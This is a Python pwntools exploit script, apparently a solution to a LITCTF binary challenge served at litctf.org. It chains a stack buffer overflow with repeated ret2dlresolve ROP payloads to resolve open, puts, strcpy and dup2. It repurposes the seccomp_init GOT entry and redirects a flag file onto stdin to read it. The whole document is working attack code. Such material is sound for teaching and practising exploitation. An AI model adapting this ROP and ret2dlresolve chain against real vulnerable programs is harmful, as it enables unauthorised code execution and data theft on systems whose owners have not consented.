#!/usr/bin/env python3
from pwn import *

e = ELF("main")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("litctf.org", 31771)
	elif args.GDB:
		return gdb.debug(e.path, "b *(main+22)\nb *(main+58)\nc")
	else:
		return process(e.path)

def checkpoint():
	# this is to sync everything
	input("Press enter to send dlresolve payload")
	#pass

if __name__ == '__main__':
	r = conn()
	
	# bss_offset = 
	rop = ROP(e)
	dlresolve = Ret2dlresolvePayload(e, symbol="open", args=["flag.txt", 0])  # 0 = O_RDONLY
	log.info("dlresolve address @ " + hex(dlresolve.data_addr))
	rop.read(0, dlresolve.data_addr)
	rop.ret2dlresolve(dlresolve)
	rop.call(e.sym['main']+22)
	
	r.sendline(b'a'*32+p64(e.bss(3072))+rop.chain())
	checkpoint()
	r.sendline(dlresolve.payload)
	
	
	rop = ROP(e)
	#rop.read(0, e.bss(128))
	dlresolve = Ret2dlresolvePayload(e, symbol="puts", args=["INFO: puts function resolved!"], data_addr = 0x404e10)
	log.info("dlresolve address @ " + hex(dlresolve.data_addr))
	rop.read(0, dlresolve.data_addr)
	rop.ret2dlresolve(dlresolve)
	rop.call(e.sym['main']+22)
	
	r.sendline(b'a'*32+p64(e.bss(1536 + 1024))+rop.chain())
	checkpoint()
	r.sendline(dlresolve.payload)
	
	print(r.recv())
	
	
	
	rop = ROP(e)
	dlresolve = Ret2dlresolvePayload(e, symbol="strcpy", args=[e.got['seccomp_init'], 0x404e10], data_addr = 0x404e20)
	log.info("dlresolve address @ " + hex(dlresolve.data_addr))
	rop.read(0, dlresolve.data_addr)
	rop.ret2dlresolve(dlresolve)
	
	rop.call(e.sym['main']+22)
	
	r.sendline(b'a'*32+p64(e.bss(1536 + 1024 + 512))+rop.chain())
	checkpoint()
	r.sendline(dlresolve.payload)
	
	
	
	# after this dlresolve, we cannot resolve any more functions because the 0 file descriptor now points to flag.txt
	
	rop = ROP(e)
	dlresolve = Ret2dlresolvePayload(e, symbol="dup2", args=[3, 0], data_addr=0x404e30)
	log.info("dlresolve address @ " + hex(dlresolve.data_addr))
	rop.read(0, dlresolve.data_addr)
	rop.ret2dlresolve(dlresolve)
	
	#rop.call(e.sym['main']+22)
	rop.read(0, e.bss(512))
	rop.seccomp_init(e.bss(512))  # remember that seccomp_init is now puts
	
	payload = b'a'*32+p64(e.bss(3072 + 512))+rop.chain()
	print("PAYLOAD LEN: " + str(len(payload)))
	assert len(payload) <= 256
	if len(payload) == 256:
		r.send(payload)
	else:
		r.sendline(payload)
	checkpoint()
	r.sendline(dlresolve.payload)
	
	r.interactive()
